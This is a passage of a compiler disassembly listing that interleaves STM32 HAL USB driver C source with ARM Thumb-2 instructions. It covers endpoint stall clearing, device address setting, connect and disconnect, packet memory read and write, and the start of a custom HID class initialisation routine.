 80084d8:	d04c      	beq.n	8008574 <USB_EPClearStall+0xb6>
    {
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 80084da:	687a      	ldr	r2, [r7, #4]
 80084dc:	683b      	ldr	r3, [r7, #0]
 80084de:	781b      	ldrb	r3, [r3, #0]
 80084e0:	009b      	lsls	r3, r3, #2
 80084e2:	4413      	add	r3, r2
 80084e4:	881b      	ldrh	r3, [r3, #0]
 80084e6:	823b      	strh	r3, [r7, #16]
 80084e8:	8a3b      	ldrh	r3, [r7, #16]
 80084ea:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80084ee:	2b00      	cmp	r3, #0
 80084f0:	d01b      	beq.n	800852a <USB_EPClearStall+0x6c>
 80084f2:	687a      	ldr	r2, [r7, #4]
 80084f4:	683b      	ldr	r3, [r7, #0]
 80084f6:	781b      	ldrb	r3, [r3, #0]
 80084f8:	009b      	lsls	r3, r3, #2
 80084fa:	4413      	add	r3, r2
 80084fc:	881b      	ldrh	r3, [r3, #0]
 80084fe:	b29b      	uxth	r3, r3
 8008500:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8008504:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8008508:	81fb      	strh	r3, [r7, #14]
 800850a:	687a      	ldr	r2, [r7, #4]
 800850c:	683b      	ldr	r3, [r7, #0]
 800850e:	781b      	ldrb	r3, [r3, #0]
 8008510:	009b      	lsls	r3, r3, #2
 8008512:	441a      	add	r2, r3
 8008514:	89fb      	ldrh	r3, [r7, #14]
 8008516:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800851a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800851e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008522:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8008526:	b29b      	uxth	r3, r3
 8008528:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 800852a:	683b      	ldr	r3, [r7, #0]
 800852c:	78db      	ldrb	r3, [r3, #3]
 800852e:	2b01      	cmp	r3, #1
 8008530:	d06c      	beq.n	800860c <USB_EPClearStall+0x14e>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 8008532:	687a      	ldr	r2, [r7, #4]
 8008534:	683b      	ldr	r3, [r7, #0]
 8008536:	781b      	ldrb	r3, [r3, #0]
 8008538:	009b      	lsls	r3, r3, #2
 800853a:	4413      	add	r3, r2
 800853c:	881b      	ldrh	r3, [r3, #0]
 800853e:	b29b      	uxth	r3, r3
 8008540:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8008544:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8008548:	81bb      	strh	r3, [r7, #12]
 800854a:	89bb      	ldrh	r3, [r7, #12]
 800854c:	f083 0320 	eor.w	r3, r3, #32
 8008550:	81bb      	strh	r3, [r7, #12]
 8008552:	687a      	ldr	r2, [r7, #4]
 8008554:	683b      	ldr	r3, [r7, #0]
 8008556:	781b      	ldrb	r3, [r3, #0]
 8008558:	009b      	lsls	r3, r3, #2
 800855a:	441a      	add	r2, r3
 800855c:	89bb      	ldrh	r3, [r7, #12]
 800855e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8008562:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008566:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800856a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800856e:	b29b      	uxth	r3, r3
 8008570:	8013      	strh	r3, [r2, #0]
 8008572:	e04b      	b.n	800860c <USB_EPClearStall+0x14e>
      }
    }
    else
    {
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8008574:	687a      	ldr	r2, [r7, #4]
 8008576:	683b      	ldr	r3, [r7, #0]
 8008578:	781b      	ldrb	r3, [r3, #0]
 800857a:	009b      	lsls	r3, r3, #2
 800857c:	4413      	add	r3, r2
 800857e:	881b      	ldrh	r3, [r3, #0]
 8008580:	82fb      	strh	r3, [r7, #22]
 8008582:	8afb      	ldrh	r3, [r7, #22]
 8008584:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8008588:	2b00      	cmp	r3, #0
 800858a:	d01b      	beq.n	80085c4 <USB_EPClearStall+0x106>
 800858c:	687a      	ldr	r2, [r7, #4]
 800858e:	683b      	ldr	r3, [r7, #0]
 8008590:	781b      	ldrb	r3, [r3, #0]
 8008592:	009b      	lsls	r3, r3, #2
 8008594:	4413      	add	r3, r2
 8008596:	881b      	ldrh	r3, [r3, #0]
 8008598:	b29b      	uxth	r3, r3
 800859a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800859e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80085a2:	82bb      	strh	r3, [r7, #20]
 80085a4:	687a      	ldr	r2, [r7, #4]
 80085a6:	683b      	ldr	r3, [r7, #0]
 80085a8:	781b      	ldrb	r3, [r3, #0]
 80085aa:	009b      	lsls	r3, r3, #2
 80085ac:	441a      	add	r2, r3
 80085ae:	8abb      	ldrh	r3, [r7, #20]
 80085b0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80085b4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80085b8:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80085bc:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80085c0:	b29b      	uxth	r3, r3
 80085c2:	8013      	strh	r3, [r2, #0]

      /* Configure VALID status for the Endpoint */
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 80085c4:	687a      	ldr	r2, [r7, #4]
 80085c6:	683b      	ldr	r3, [r7, #0]
 80085c8:	781b      	ldrb	r3, [r3, #0]
 80085ca:	009b      	lsls	r3, r3, #2
 80085cc:	4413      	add	r3, r2
 80085ce:	881b      	ldrh	r3, [r3, #0]
 80085d0:	b29b      	uxth	r3, r3
 80085d2:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80085d6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80085da:	827b      	strh	r3, [r7, #18]
 80085dc:	8a7b      	ldrh	r3, [r7, #18]
 80085de:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 80085e2:	827b      	strh	r3, [r7, #18]
 80085e4:	8a7b      	ldrh	r3, [r7, #18]
 80085e6:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 80085ea:	827b      	strh	r3, [r7, #18]
 80085ec:	687a      	ldr	r2, [r7, #4]
 80085ee:	683b      	ldr	r3, [r7, #0]
 80085f0:	781b      	ldrb	r3, [r3, #0]
 80085f2:	009b      	lsls	r3, r3, #2
 80085f4:	441a      	add	r2, r3
 80085f6:	8a7b      	ldrh	r3, [r7, #18]
 80085f8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80085fc:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008600:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008604:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8008608:	b29b      	uxth	r3, r3
 800860a:	8013      	strh	r3, [r2, #0]
    }
  }

  return HAL_OK;
 800860c:	2300      	movs	r3, #0
}
 800860e:	4618      	mov	r0, r3
 8008610:	371c      	adds	r7, #28
 8008612:	46bd      	mov	sp, r7
 8008614:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008618:	4770      	bx	lr

0800861a <USB_SetDevAddress>:
  * @param  address new device address to be assigned
  *          This parameter can be a value from 0 to 255
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_SetDevAddress(USB_TypeDef *USBx, uint8_t address)
{
 800861a:	b480      	push	{r7}
 800861c:	b083      	sub	sp, #12
 800861e:	af00      	add	r7, sp, #0
 8008620:	6078      	str	r0, [r7, #4]
 8008622:	460b      	mov	r3, r1
 8008624:	70fb      	strb	r3, [r7, #3]
  if (address == 0U)
 8008626:	78fb      	ldrb	r3, [r7, #3]
 8008628:	2b00      	cmp	r3, #0
 800862a:	d103      	bne.n	8008634 <USB_SetDevAddress+0x1a>
  {
    /* set device address and enable function */
    USBx->DADDR = (uint16_t)USB_DADDR_EF;
 800862c:	687b      	ldr	r3, [r7, #4]
 800862e:	2280      	movs	r2, #128	; 0x80
 8008630:	f8a3 204c 	strh.w	r2, [r3, #76]	; 0x4c
  }

  return HAL_OK;
 8008634:	2300      	movs	r3, #0
}
 8008636:	4618      	mov	r0, r3
 8008638:	370c      	adds	r7, #12
 800863a:	46bd      	mov	sp, r7
 800863c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008640:	4770      	bx	lr

08008642 <USB_DevConnect>:
  * @brief  USB_DevConnect Connect the USB device by enabling the pull-up/pull-down
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_DevConnect(USB_TypeDef *USBx)
{
 8008642:	b480      	push	{r7}
 8008644:	b083      	sub	sp, #12
 8008646:	af00      	add	r7, sp, #0
 8008648:	6078      	str	r0, [r7, #4]
  /* Enabling DP Pull-UP bit to Connect internal PU resistor on USB DP line */
  USBx->BCDR |= (uint16_t)USB_BCDR_DPPU;
 800864a:	687b      	ldr	r3, [r7, #4]
 800864c:	f8b3 3058 	ldrh.w	r3, [r3, #88]	; 0x58
 8008650:	b29b      	uxth	r3, r3
 8008652:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8008656:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800865a:	b29a      	uxth	r2, r3
 800865c:	687b      	ldr	r3, [r7, #4]
 800865e:	f8a3 2058 	strh.w	r2, [r3, #88]	; 0x58

  return HAL_OK;
 8008662:	2300      	movs	r3, #0
}
 8008664:	4618      	mov	r0, r3
 8008666:	370c      	adds	r7, #12
 8008668:	46bd      	mov	sp, r7
 800866a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800866e:	4770      	bx	lr

08008670 <USB_DevDisconnect>:
  * @brief  USB_DevDisconnect Disconnect the USB device by disabling the pull-up/pull-down
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_DevDisconnect(USB_TypeDef *USBx)
{
 8008670:	b480      	push	{r7}
 8008672:	b083      	sub	sp, #12
 8008674:	af00      	add	r7, sp, #0
 8008676:	6078      	str	r0, [r7, #4]
  /* Disable DP Pull-Up bit to disconnect the Internal PU resistor on USB DP line */
  USBx->BCDR &= (uint16_t)(~(USB_BCDR_DPPU));
 8008678:	687b      	ldr	r3, [r7, #4]
 800867a:	f8b3 3058 	ldrh.w	r3, [r3, #88]	; 0x58
 800867e:	b29b      	uxth	r3, r3
 8008680:	f3c3 030e 	ubfx	r3, r3, #0, #15
 8008684:	b29a      	uxth	r2, r3
 8008686:	687b      	ldr	r3, [r7, #4]
 8008688:	f8a3 2058 	strh.w	r2, [r3, #88]	; 0x58

  return HAL_OK;
 800868c:	2300      	movs	r3, #0
}
 800868e:	4618      	mov	r0, r3
 8008690:	370c      	adds	r7, #12
 8008692:	46bd      	mov	sp, r7
 8008694:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008698:	4770      	bx	lr

0800869a <USB_ReadInterrupts>:
  * @brief  USB_ReadInterrupts return the global USB interrupt status
  * @param  USBx Selected device
  * @retval USB Global Interrupt status
  */
uint32_t USB_ReadInterrupts(USB_TypeDef const *USBx)
{
 800869a:	b480      	push	{r7}
 800869c:	b085      	sub	sp, #20
 800869e:	af00      	add	r7, sp, #0
 80086a0:	6078      	str	r0, [r7, #4]
  uint32_t tmpreg;

  tmpreg = USBx->ISTR;
 80086a2:	687b      	ldr	r3, [r7, #4]
 80086a4:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 80086a8:	b29b      	uxth	r3, r3
 80086aa:	60fb      	str	r3, [r7, #12]
  return tmpreg;
 80086ac:	68fb      	ldr	r3, [r7, #12]
}
 80086ae:	4618      	mov	r0, r3
 80086b0:	3714      	adds	r7, #20
 80086b2:	46bd      	mov	sp, r7
 80086b4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80086b8:	4770      	bx	lr

080086ba <USB_EP0_OutStart>:
  * @param  USBx Selected device
  * @param  psetup pointer to setup packet
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EP0_OutStart(USB_TypeDef *USBx, uint8_t *psetup)
{
 80086ba:	b480      	push	{r7}
 80086bc:	b083      	sub	sp, #12
 80086be:	af00      	add	r7, sp, #0
 80086c0:	6078      	str	r0, [r7, #4]
 80086c2:	6039      	str	r1, [r7, #0]
  UNUSED(psetup);
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */
  return HAL_OK;
 80086c4:	2300      	movs	r3, #0
}
 80086c6:	4618      	mov	r0, r3
 80086c8:	370c      	adds	r7, #12
 80086ca:	46bd      	mov	sp, r7
 80086cc:	f85d 7b04 	ldr.w	r7, [sp], #4
 80086d0:	4770      	bx	lr

080086d2 <USB_WritePMA>:
  * @param   wPMABufAddr address into PMA.
  * @param   wNBytes no. of bytes to be copied.
  * @retval None
  */
void USB_WritePMA(USB_TypeDef const *USBx, uint8_t *pbUsrBuf, uint16_t wPMABufAddr, uint16_t wNBytes)
{
 80086d2:	b480      	push	{r7}
 80086d4:	b08b      	sub	sp, #44	; 0x2c
 80086d6:	af00      	add	r7, sp, #0
 80086d8:	60f8      	str	r0, [r7, #12]
 80086da:	60b9      	str	r1, [r7, #8]
 80086dc:	4611      	mov	r1, r2
 80086de:	461a      	mov	r2, r3
 80086e0:	460b      	mov	r3, r1
 80086e2:	80fb      	strh	r3, [r7, #6]
 80086e4:	4613      	mov	r3, r2
 80086e6:	80bb      	strh	r3, [r7, #4]
  uint32_t n = ((uint32_t)wNBytes + 1U) >> 1;
 80086e8:	88bb      	ldrh	r3, [r7, #4]
 80086ea:	3301      	adds	r3, #1
 80086ec:	085b      	lsrs	r3, r3, #1
 80086ee:	61bb      	str	r3, [r7, #24]
  uint32_t BaseAddr = (uint32_t)USBx;
 80086f0:	68fb      	ldr	r3, [r7, #12]
 80086f2:	617b      	str	r3, [r7, #20]
  uint32_t count;
  uint16_t WrVal;
  __IO uint16_t *pdwVal;
  uint8_t *pBuf = pbUsrBuf;
 80086f4:	68bb      	ldr	r3, [r7, #8]
 80086f6:	61fb      	str	r3, [r7, #28]

  pdwVal = (__IO uint16_t *)(BaseAddr + 0x400U + ((uint32_t)wPMABufAddr * PMA_ACCESS));
 80086f8:	88fa      	ldrh	r2, [r7, #6]
 80086fa:	697b      	ldr	r3, [r7, #20]
 80086fc:	4413      	add	r3, r2
 80086fe:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 8008702:	623b      	str	r3, [r7, #32]

  for (count = n; count != 0U; count--)
 8008704:	69bb      	ldr	r3, [r7, #24]
 8008706:	627b      	str	r3, [r7, #36]	; 0x24
 8008708:	e01b      	b.n	8008742 <USB_WritePMA+0x70>
  {
    WrVal = pBuf[0];
 800870a:	69fb      	ldr	r3, [r7, #28]
 800870c:	781b      	ldrb	r3, [r3, #0]
 800870e:	827b      	strh	r3, [r7, #18]
    WrVal |= (uint16_t)pBuf[1] << 8;
 8008710:	69fb      	ldr	r3, [r7, #28]
 8008712:	3301      	adds	r3, #1
 8008714:	781b      	ldrb	r3, [r3, #0]
 8008716:	021b      	lsls	r3, r3, #8
 8008718:	b21a      	sxth	r2, r3
 800871a:	f9b7 3012 	ldrsh.w	r3, [r7, #18]
 800871e:	4313      	orrs	r3, r2
 8008720:	b21b      	sxth	r3, r3
 8008722:	827b      	strh	r3, [r7, #18]
    *pdwVal = (WrVal & 0xFFFFU);
 8008724:	6a3b      	ldr	r3, [r7, #32]
 8008726:	8a7a      	ldrh	r2, [r7, #18]
 8008728:	801a      	strh	r2, [r3, #0]
    pdwVal++;
 800872a:	6a3b      	ldr	r3, [r7, #32]
 800872c:	3302      	adds	r3, #2
 800872e:	623b      	str	r3, [r7, #32]

#if PMA_ACCESS > 1U
    pdwVal++;
#endif /* PMA_ACCESS */

    pBuf++;
 8008730:	69fb      	ldr	r3, [r7, #28]
 8008732:	3301      	adds	r3, #1
 8008734:	61fb      	str	r3, [r7, #28]
    pBuf++;
 8008736:	69fb      	ldr	r3, [r7, #28]
 8008738:	3301      	adds	r3, #1
 800873a:	61fb      	str	r3, [r7, #28]
  for (count = n; count != 0U; count--)
 800873c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800873e:	3b01      	subs	r3, #1
 8008740:	627b      	str	r3, [r7, #36]	; 0x24
 8008742:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8008744:	2b00      	cmp	r3, #0
 8008746:	d1e0      	bne.n	800870a <USB_WritePMA+0x38>
  }
}
 8008748:	bf00      	nop
 800874a:	bf00      	nop
 800874c:	372c      	adds	r7, #44	; 0x2c
 800874e:	46bd      	mov	sp, r7
 8008750:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008754:	4770      	bx	lr

08008756 <USB_ReadPMA>:
  * @param   wPMABufAddr address into PMA.
  * @param   wNBytes no. of bytes to be copied.
  * @retval None
  */
void USB_ReadPMA(USB_TypeDef const *USBx, uint8_t *pbUsrBuf, uint16_t wPMABufAddr, uint16_t wNBytes)
{
 8008756:	b480      	push	{r7}
 8008758:	b08b      	sub	sp, #44	; 0x2c
 800875a:	af00      	add	r7, sp, #0
 800875c:	60f8      	str	r0, [r7, #12]
 800875e:	60b9      	str	r1, [r7, #8]
 8008760:	4611      	mov	r1, r2
 8008762:	461a      	mov	r2, r3
 8008764:	460b      	mov	r3, r1
 8008766:	80fb      	strh	r3, [r7, #6]
 8008768:	4613      	mov	r3, r2
 800876a:	80bb      	strh	r3, [r7, #4]
  uint32_t n = (uint32_t)wNBytes >> 1;
 800876c:	88bb      	ldrh	r3, [r7, #4]
 800876e:	085b      	lsrs	r3, r3, #1
 8008770:	b29b      	uxth	r3, r3
 8008772:	61bb      	str	r3, [r7, #24]
  uint32_t BaseAddr = (uint32_t)USBx;
 8008774:	68fb      	ldr	r3, [r7, #12]
 8008776:	617b      	str	r3, [r7, #20]
  uint32_t count;
  uint32_t RdVal;
  __IO uint16_t *pdwVal;
  uint8_t *pBuf = pbUsrBuf;
 8008778:	68bb      	ldr	r3, [r7, #8]
 800877a:	61fb      	str	r3, [r7, #28]

  pdwVal = (__IO uint16_t *)(BaseAddr + 0x400U + ((uint32_t)wPMABufAddr * PMA_ACCESS));
 800877c:	88fa      	ldrh	r2, [r7, #6]
 800877e:	697b      	ldr	r3, [r7, #20]
 8008780:	4413      	add	r3, r2
 8008782:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 8008786:	623b      	str	r3, [r7, #32]

  for (count = n; count != 0U; count--)
 8008788:	69bb      	ldr	r3, [r7, #24]
 800878a:	627b      	str	r3, [r7, #36]	; 0x24
 800878c:	e018      	b.n	80087c0 <USB_ReadPMA+0x6a>
  {
    RdVal = *(__IO uint16_t *)pdwVal;
 800878e:	6a3b      	ldr	r3, [r7, #32]
 8008790:	881b      	ldrh	r3, [r3, #0]
 8008792:	b29b      	uxth	r3, r3
 8008794:	613b      	str	r3, [r7, #16]
    pdwVal++;
 8008796:	6a3b      	ldr	r3, [r7, #32]
 8008798:	3302      	adds	r3, #2
 800879a:	623b      	str	r3, [r7, #32]
    *pBuf = (uint8_t)((RdVal >> 0) & 0xFFU);
 800879c:	693b      	ldr	r3, [r7, #16]
 800879e:	b2da      	uxtb	r2, r3
 80087a0:	69fb      	ldr	r3, [r7, #28]
 80087a2:	701a      	strb	r2, [r3, #0]
    pBuf++;
 80087a4:	69fb      	ldr	r3, [r7, #28]
 80087a6:	3301      	adds	r3, #1
 80087a8:	61fb      	str	r3, [r7, #28]
    *pBuf = (uint8_t)((RdVal >> 8) & 0xFFU);
 80087aa:	693b      	ldr	r3, [r7, #16]
 80087ac:	0a1b      	lsrs	r3, r3, #8
 80087ae:	b2da      	uxtb	r2, r3
 80087b0:	69fb      	ldr	r3, [r7, #28]
 80087b2:	701a      	strb	r2, [r3, #0]
    pBuf++;
 80087b4:	69fb      	ldr	r3, [r7, #28]
 80087b6:	3301      	adds	r3, #1
 80087b8:	61fb      	str	r3, [r7, #28]
  for (count = n; count != 0U; count--)
 80087ba:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80087bc:	3b01      	subs	r3, #1
 80087be:	627b      	str	r3, [r7, #36]	; 0x24
 80087c0:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80087c2:	2b00      	cmp	r3, #0
 80087c4:	d1e3      	bne.n	800878e <USB_ReadPMA+0x38>
#if PMA_ACCESS > 1U
    pdwVal++;
#endif /* PMA_ACCESS */
  }

  if ((wNBytes % 2U) != 0U)
 80087c6:	88bb      	ldrh	r3, [r7, #4]
 80087c8:	f003 0301 	and.w	r3, r3, #1
 80087cc:	b29b      	uxth	r3, r3
 80087ce:	2b00      	cmp	r3, #0
 80087d0:	d007      	beq.n	80087e2 <USB_ReadPMA+0x8c>
  {
    RdVal = *pdwVal;
 80087d2:	6a3b      	ldr	r3, [r7, #32]
 80087d4:	881b      	ldrh	r3, [r3, #0]
 80087d6:	b29b      	uxth	r3, r3
 80087d8:	613b      	str	r3, [r7, #16]
    *pBuf = (uint8_t)((RdVal >> 0) & 0xFFU);
 80087da:	693b      	ldr	r3, [r7, #16]
 80087dc:	b2da      	uxtb	r2, r3
 80087de:	69fb      	ldr	r3, [r7, #28]
 80087e0:	701a      	strb	r2, [r3, #0]
  }
}
 80087e2:	bf00      	nop
 80087e4:	372c      	adds	r7, #44	; 0x2c
 80087e6:	46bd      	mov	sp, r7
 80087e8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80087ec:	4770      	bx	lr
	...

080087f0 <USBD_CUSTOM_HID_Init>:
  * @param  pdev: device instance
  * @param  cfgidx: Configuration index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_Init(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 80087f0:	b580      	push	{r7, lr}
 80087f2:	b084      	sub	sp, #16
 80087f4:	af00      	add	r7, sp, #0
 80087f6:	6078      	str	r0, [r7, #4]
 80087f8:	460b      	mov	r3, r1
 80087fa:	70fb      	strb	r3, [r7, #3]
  UNUSED(cfgidx);
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)USBD_malloc(sizeof(USBD_CUSTOM_HID_HandleTypeDef));
 80087fc:	2024      	movs	r0, #36	; 0x24
 80087fe:	f004 fd05 	bl	800d20c <USBD_static_malloc>
 8008802:	60f8      	str	r0, [r7, #12]

  if (hhid == NULL)
 8008804:	68fb      	ldr	r3, [r7, #12]
 8008806:	2b00      	cmp	r3, #0
 8008808:	d109      	bne.n	800881e <USBD_CUSTOM_HID_Init+0x2e>
  {
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 800880a:	687b      	ldr	r3, [r7, #4]
 800880c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008810:	687b      	ldr	r3, [r7, #4]
 8008812:	32b0      	adds	r2, #176	; 0xb0
 8008814:	2100      	movs	r1, #0
 8008816:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    return (uint8_t)USBD_EMEM;
 800881a:	2302      	movs	r3, #2
 800881c:	e08b      	b.n	8008936 <USBD_CUSTOM_HID_Init+0x146>
  }

  pdev->pClassDataCmsit[pdev->classId] = (void *)hhid;
 800881e:	687b      	ldr	r3, [r7, #4]
 8008820:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008824:	687b      	ldr	r3, [r7, #4]
 8008826:	32b0      	adds	r2, #176	; 0xb0
 8008828:	68f9      	ldr	r1, [r7, #12]
 800882a:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
  pdev->pClassData = pdev->pClassDataCmsit[pdev->classId];
 800882e:	687b      	ldr	r3, [r7, #4]
 8008830:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008834:	687b      	ldr	r3, [r7, #4]
 8008836:	32b0      	adds	r2, #176	; 0xb0
 8008838:	f853 2022 	ldr.w	r2, [r3, r2, lsl #2]
 800883c:	687b      	ldr	r3, [r7, #4]
 800883e:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  /* Get the Endpoints addresses allocated for this class instance */
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_speed == USBD_SPEED_HIGH)
 8008842:	687b      	ldr	r3, [r7, #4]
 8008844:	7c1b      	ldrb	r3, [r3, #16]
 8008846:	2b00      	cmp	r3, #0
 8008848:	d11b      	bne.n	8008882 <USBD_CUSTOM_HID_Init+0x92>
  {
    pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = CUSTOM_HID_HS_BINTERVAL;
 800884a:	4b3d      	ldr	r3, [pc, #244]	; (8008940 <USBD_CUSTOM_HID_Init+0x150>)
 800884c:	781b      	ldrb	r3, [r3, #0]
 800884e:	f003 020f 	and.w	r2, r3, #15
 8008852:	6879      	ldr	r1, [r7, #4]
 8008854:	4613      	mov	r3, r2
 8008856:	009b      	lsls	r3, r3, #2
 8008858:	4413      	add	r3, r2
 800885a:	009b      	lsls	r3, r3, #2
 800885c:	440b      	add	r3, r1
 800885e:	3326      	adds	r3, #38	; 0x26
 8008860:	2205      	movs	r2, #5
 8008862:	801a      	strh	r2, [r3, #0]
    pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008864:	4b37      	ldr	r3, [pc, #220]	; (8008944 <USBD_CUSTOM_HID_Init+0x154>)
 8008866:	781b      	ldrb	r3, [r3, #0]
 8008868:	f003 020f 	and.w	r2, r3, #15
 800886c:	6879      	ldr	r1, [r7, #4]
 800886e:	4613      	mov	r3, r2
 8008870:	009b      	lsls	r3, r3, #2
 8008872:	4413      	add	r3, r2
 8008874:	009b      	lsls	r3, r3, #2
 8008876:	440b      	add	r3, r1
 8008878:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 800887c:	2205      	movs	r2, #5
 800887e:	801a      	strh	r2, [r3, #0]
 8008880:	e01a      	b.n	80088b8 <USBD_CUSTOM_HID_Init+0xc8>
  }
  else   /* LOW and FULL-speed endpoints */
  {
    pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008882:	4b2f      	ldr	r3, [pc, #188]	; (8008940 <USBD_CUSTOM_HID_Init+0x150>)
 8008884:	781b      	ldrb	r3, [r3, #0]
 8008886:	f003 020f 	and.w	r2, r3, #15
 800888a:	6879      	ldr	r1, [r7, #4]
 800888c:	4613      	mov	r3, r2
 800888e:	009b      	lsls	r3, r3, #2
 8008890:	4413      	add	r3, r2
 8008892:	009b      	lsls	r3, r3, #2
 8008894:	440b      	add	r3, r1
 8008896:	3326      	adds	r3, #38	; 0x26
 8008898:	2205      	movs	r2, #5
 800889a:	801a      	strh	r2, [r3, #0]
    pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = CUSTOM_HID_FS_BINTERVAL;
 800889c:	4b29      	ldr	r3, [pc, #164]	; (8008944 <USBD_CUSTOM_HID_Init+0x154>)
 800889e:	781b      	ldrb	r3, [r3, #0]
 80088a0:	f003 020f 	and.w	r2, r3, #15
 80088a4:	6879      	ldr	r1, [r7, #4]
 80088a6:	4613      	mov	r3, r2
 80088a8:	009b      	lsls	r3, r3, #2
 80088aa:	4413      	add	r3, r2
 80088ac:	009b      	lsls	r3, r3, #2
 80088ae:	440b      	add	r3, r1
 80088b0:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 80088b4:	2205      	movs	r2, #5
 80088b6:	801a      	strh	r2, [r3, #0]
  }

  /* Open EP IN */
  (void)USBD_LL_OpenEP(pdev, CUSTOMHIDInEpAdd, USBD_EP_TYPE_INTR,
 80088b8:	4b21      	ldr	r3, [pc, #132]	; (8008940 <USBD_CUSTOM_HID_Init+0x150>)
 80088ba:	7819      	ldrb	r1, [r3, #0]
 80088bc:	2302      	movs	r3, #2
 80088be:	2203      	movs	r2, #3
 80088c0:	6878      	ldr	r0, [r7, #4]
 80088c2:	f004 fa6f 	bl	800cda4 <USBD_LL_OpenEP>
                       CUSTOM_HID_EPIN_SIZE);

  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].is_used = 1U;
 80088c6:	4b1e      	ldr	r3, [pc, #120]	; (8008940 <USBD_CUSTOM_HID_Init+0x150>)
 80088c8:	781b      	ldrb	r3, [r3, #0]
 80088ca:	f003 020f 	and.w	r2, r3, #15
 80088ce:	6879      	ldr	r1, [r7, #4]
 80088d0:	4613      	mov	r3, r2
 80088d2:	009b      	lsls	r3, r3, #2
 80088d4:	4413      	add	r3, r2
 80088d6:	009b      	lsls	r3, r3, #2
 80088d8:	440b      	add	r3, r1
 80088da:	3324      	adds	r3, #36	; 0x24
 80088dc:	2201      	movs	r2, #1
 80088de:	801a      	strh	r2, [r3, #0]

  /* Open EP OUT */
  (void)USBD_LL_OpenEP(pdev, CUSTOMHIDOutEpAdd, USBD_EP_TYPE_INTR,
 80088e0:	4b18      	ldr	r3, [pc, #96]	; (8008944 <USBD_CUSTOM_HID_Init+0x154>)
 80088e2:	7819      	ldrb	r1, [r3, #0]
 80088e4:	2302      	movs	r3, #2
 80088e6:	2203      	movs	r2, #3
